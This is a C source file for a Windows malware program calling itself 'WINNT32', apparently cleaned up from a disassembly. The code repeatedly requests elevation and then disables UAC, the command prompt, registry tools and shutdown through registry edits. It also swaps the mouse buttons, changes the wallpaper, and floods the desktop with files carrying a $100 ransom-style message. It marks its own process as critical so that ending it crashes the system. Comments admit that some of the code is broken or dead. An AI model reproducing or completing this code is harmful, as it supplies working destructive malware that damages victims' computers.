#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#pragma comment (lib, "Bcrypt.lib")

#include "native.h"
#include "ex.h"


int __cdecl main( int argc, const char **argv, const char **envp )
{
    hInstance = GetModuleHandleW( 0 );
	HANDLE hHeap = GetProcessHeap( );
	ProcessHandle = GetCurrentProcess( );

	BCRYPT_ALG_HANDLE phAlgorithm;
	LPCWSTR pszAlgId;

	// Open a handle for the RNG encryption algorithm
	if( !BCryptOpenAlgorithmProvider( &phAlgorithm, L"RNG", 0, 0 ) ) {

		RandomDataGenerated = HeapAlloc( hHeap, 8, 16 );

		BCryptGenRandom( phAlgorithm, ( PUCHAR )RandomDataGenerated, 16, 0 );
		BCryptCloseAlgorithmProvider( phAlgorithm, 0 );

		// Synchronization usage?
		InitializeCriticalSection( &CriticalSection );

	}

	SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;

	// Init SID
	BOOL IsMember =
		AllocateAndInitializeSid(
			&pIdentifierAuthority,
			0x2,
			0x20,
			0x220,
			0,
			0,
			0,
			0,
			0,
			0,
			&phAlgorithm
		);

	BOOL bToken = 0;
	if( !IsMember
		|| ( bToken = CheckTokenMembership( 0, phAlgorithm, &IsMember ),
			 IsMember = bToken ? IsMember : 0,
			 FreeSid( phAlgorithm ),
			 !IsMember ) ) { // UAC-elevated -> ignore

		// Spam UAC until user approves process elevation
		ShellExecuteA( 0, "runas", *argv, 0, 0, 0 );

		// Clean-up before exit
		goto CleanAndExit;
	}


	////////////////////////////

	// Prepare to get NT version
	OSVERSIONINFO VersionInformation;
	VersionInformation.dwOSVersionInfoSize = 284;

	RtlGetVersion( &VersionInformation );
	
	// 
	if( VersionInformation.dwMajorVersion == 10 ) {

		PTOKEN_PRIVILEGES pPrivileges = ( PTOKEN_PRIVILEGES )HeapAlloc( hHeap, 8, 0x34 );
		if( !OpenProcessToken( ProcessHandle, 0x28, ( PHANDLE )&IsMember ) )
			goto CleanAndExit;

		pPrivileges->PrivilegeCount = 4;
		pPrivileges->Privileges[ 0 ].Luid.LowPart = 17;
		pPrivileges[ 1 ].PrivilegeCount = 18;
		pPrivileges[ 1 ].Privileges[ 0 ].Attributes = 19;
		pPrivileges[ 2 ].Privileges[ 0 ].Luid.HighPart = 20;

		// Broken code by andrew (line 90 already sets an attribute to index 1)
		// Overriding index 1 attribute
		for( UINT i = 1; i < pPrivileges->PrivilegeCount; i++ )
			pPrivileges->Privileges[ i ].Attributes = 3;

		// Apply privileges
		AdjustTokenPrivileges( ( HANDLE )IsMember, 0, pPrivileges, 0, 0, 0 );

		// Clean-up
		CloseHandle( ( HANDLE )IsMember );
		HeapFree( hHeap, 0, pPrivileges );




		WCHAR FileName;

		// Unironically make the api return INVALID_FILE_ATTRIBUTES
		if( GetFileAttributesW( &FileName ) == -1 ) {

			// Create a mutex
			CreateMutexW( 0, 1, L"processLimit" );

			// Check if the same Mutex doesn't exist
			if( GetLastError( ) != ERROR_ALREADY_EXISTS &&
				MessageBoxW( 0, L"This malware is no joke, continue?", L"WINNT32", 0x24 ) == 6 ) {

				// I'm not writing the remapping keyboard keys code

				// Disable problematic Windows Functions.
				RegistryAdd( HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Policies\\System", L"EnableLUA", REG_DWORD, 0 );
				RegistryAdd( HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurentVersion\\Policies\\Explorer", L"NoClose", REG_DWORD, 1 );
				RegistryAdd( HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1 );
				RegistryAdd( HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2 );

				SwapMouseButton( 1 );


				// Apply cringe wallpaper
				WCHAR AppdataLocation[ MAX_PATH + 1 ];
				SHGetSpecialFolderPathW( HWND_DESKTOP, AppdataLocation, CSIDL_LOCAL_APPDATA, FALSE );

				// Allocate a bit of memory :c
				WCHAR* wBuffer = malloc( lstrlen( AppdataLocation ) + 14 * sizeof( WCHAR ) );

				lstrcpyW( wBuffer, AppdataLocation );
				lstrcatW( wBuffer, L"\\noescape.png" );

				//ExtractResource( NULL, IDR_RCDATA1, wBuffer );
				SystemParametersInfoW( SPI_SETDESKWALLPAPER, 0, wBuffer, SPIF_UPDATEINIFILE );
				RegistryAdd( HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"AutoColorization", REG_DWORD, NULL, 1 );

				// Generate random files on desktop
				CHAR DesktopLocation[ MAX_PATH + 1 ];
				SHGetSpecialFolderPathA( HWND_DESKTOP, DesktopLocation, CSIDL_DESKTOP, FALSE );

				// WipeDirectory(commonLocations.userDesktop, 1);

				BYTE randomNumber = RandomRange( 16, 32 );
				WCHAR* Filename = malloc( randomNumber * sizeof( WCHAR ) );

				// Totally safe C code! ~ andrew
				wBuffer = realloc( wBuffer, lstrlen( DesktopLocation ) + 32 * sizeof( WCHAR ) );

				// Code below literally by andrew
				for( int i = 0; i < UCHAR_MAX; i++ ) {
					static int j = 0;
					if( Filename ) {
						j = 0;

						while( j < randomNumber - 1 )
							Filename[ j++ ] = ( WCHAR )RandomRange( 0x0530, 0x312F );

						Filename[ j ] = '\0';
					}

					wsprintfW( wBuffer, L"%s\\%s", DesktopLocation, Filename );

					HANDLE hFile =
						CreateFileW(
							wBuffer,
							GENERIC_WRITE,
							0,
							NULL,
							CREATE_ALWAYS,
							FILE_ATTRIBUTE_NORMAL,
							NULL
						);

					if( hFile != INVALID_HANDLE_VALUE && hFile )
						WriteFile(
							hFile,
							"There is no escape from my malware muahaha now pay $100",
							55,
							NULL,
							NULL
						); // Cringest text ever

					CloseHandle( hFile );

					randomNumber = RandomRange( 16, 32 );
					Filename = realloc( Filename, randomNumber * sizeof( WCHAR ) );
				}

				free( Filename );
				free( wBuffer );

			}
		}

		// From now on, this code would probably just crash the whole program
		// As it is just pasted from IDA and cleaned
		// ^ My ego too hard

		if( !argv[ 1 ] ) {
			CreateMutexW( 0, 1, L"processLimit" );

			if( GetLastError( ) != 183 ) {

				static DWORD Data;
				WNDCLASSEXW v84;
				*( DWORD * )pIdentifierAuthority.Value = 1;
				NtSetInformationProcess( ProcessHandle, ProcessBreakOnTermination, &pIdentifierAuthority, 4u );
				*( DWORD * )Data = 0;
				v84.style = 0;
				*( DWORD64 * )&v84.cbClsExtra = 0i64;
				*( DWORD64 * )&v84.hbrBackground = 0i64;
				v84.cbSize = 48;
				v84.lpszClassName = "WINNT32";
				v84.lpfnWndProc = WndProc;
				v84.hInstance = hInstance;
				v84.hCursor = LoadCursorW( hInstance, ( LPCWSTR )0x7F00 );
				v84.hIcon = LoadIconW( hInstance, ( LPCWSTR )0x65 );
				v84.hIconSm = LoadIconW( hInstance, ( LPCWSTR )0x65 );
				RegisterClassExW( &v84 );
				HWND v67 = CreateWindowExW( 8u, "WINNT32", "WINNT32", 0xCB0000u, 0, 0, 400, 720, 0, 0, hInstance, 0 );
				ShowWindow( v67, 5 );
				UpdateWindow( v67 );

				if( *( DWORD * )Data == 1 ) {
					ShowWindow( v67, 5 );
					UpdateWindow( v67 );
				}
				if( 0 == 9 ) {
					if( 0 == 3 ) {
						CreateMutexW( 0, 1, L"processLimitPayload" );
						CreateThread( 0, 0, ( LPTHREAD_START_ROUTINE )GdiPayload, 0, 0, 0 );
					}
				} else if( 0 == 21 && 0 == 10 ) {
					CreateMutexW( 0, 1, L"processLimitPayload" );
					//CreateThread( 0, 0, StartAddress, 0, 0, 0 );
				}
				BYTE buf[ 4 ];
				while( GetMessageW( ( LPMSG )buf, 0, 0, 0 ) ) {
					TranslateMessage( ( const MSG * )buf );
					DispatchMessageW( ( const MSG * )buf );
				}

			}
			goto CleanAndExit;
		}
	}

	// Incompatible NT version
	LPCWSTR lpMem = ( LPCWSTR )HeapAlloc( hHeap, 0x8, 0x9C );
	wsprintfW(
		( LPWSTR )lpMem,
		L"You are running NT %d.%d!\r\nThis malware requires NT 10.0 to run properly.",
		VersionInformation.dwMajorVersion,
		VersionInformation.dwMinorVersion );

	MessageBoxW( 0, lpMem, L"WINNT32", 16 );
	HeapFree( hHeap, 0, ( LPVOID )lpMem );


	// Clean-up
CleanAndExit:
	DeleteCriticalSection( &CriticalSection );
	HeapFree( hHeap, 0, RandomDataGenerated );
	CloseHandle( ProcessHandle );

	return 0;
}